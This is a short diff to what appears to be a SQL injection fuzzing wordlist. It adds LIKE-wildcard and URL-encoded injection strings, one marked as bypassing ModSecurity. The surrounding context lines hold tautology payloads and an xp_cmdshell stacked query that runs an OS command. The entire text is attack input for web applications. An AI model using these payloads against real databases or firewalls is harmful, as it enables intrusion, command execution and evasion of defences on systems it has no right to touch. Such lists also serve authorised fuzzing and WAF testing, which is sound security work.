@@ -331,3 +331,8 @@ t'exec master..xp_cmdshell 'nslookup www.google.com'--
 ' or ''='
 ' or 3=3
  or 3=3 --
+%_[^!_%/%a?F%_D)_(F%)_%([)({}%){()}£$&N%_)$*£()$*R"_)][%](%[x])%a][$*"£$-9]_%'
+'%64_[^!_%65/%aa?F%64_D)_(F%64)_%36([)({}%33){()}£$&N%55_)$*£()$*R"_)][%55](%66[x])%ba][$*"£$-9]_%54' bypasses modsecurity
+_[r/a)_ _(r/b)_ _(r-d)_
+%n[^n]y[^j]l[^k]d[^l]h[^z]t[^k]b[^q]t[^q][^n]!%
+%_[aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[! -z]@$!_%
